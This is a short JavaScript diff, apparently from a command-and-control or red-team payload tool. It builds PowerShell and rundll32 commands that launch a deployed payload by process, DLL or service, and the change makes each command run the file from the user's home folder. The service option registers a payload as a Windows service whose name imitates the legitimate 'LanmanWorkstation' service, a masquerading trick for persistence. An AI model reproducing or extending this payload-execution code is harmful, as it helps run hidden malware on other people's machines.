@@ -5,15 +5,15 @@
 const payloadType = payload.configuration.type;
 const timestamp = new Date().getTime();
 const execution = {
-  EXECUTABLE: (filename) => `Start-Process ${filename}`,
-  DEBUG_EXECUTABLE: (filename) => `Start-Process ${filename}`,
+  EXECUTABLE: (filename) => `Start-Process $HOME\\${filename}`,
+  DEBUG_EXECUTABLE: (filename) => `Start-Process $HOME\\${filename}`,
   SERVICE: (filename) =>
-    `New-Service -Name LanmanWorkstation${timestamp} -BinaryPathName (Resolve-Path ${filename}); Start-Service -Name LanmanWorkstation${timestamp}`,
+    `New-Service -Name LanmanWorkstation${timestamp} -BinaryPathName (Resolve-Path $HOME\\${filename}); Start-Service -Name LanmanWorkstation${timestamp}`,
   DLL: (filename) => {
     if (payload.configuration.dllMethodName) {
-      return `rundll32.exe ${filename},${payload.configuration.dllMethodName}`;
+      return `rundll32.exe $HOME\\${filename},${payload.configuration.dllMethodName}`;
     } else {
-      return `rundll32.exe ${filename},bob`;
+      return `rundll32.exe $HOME\\${filename},bob`;
     }
   },
 };
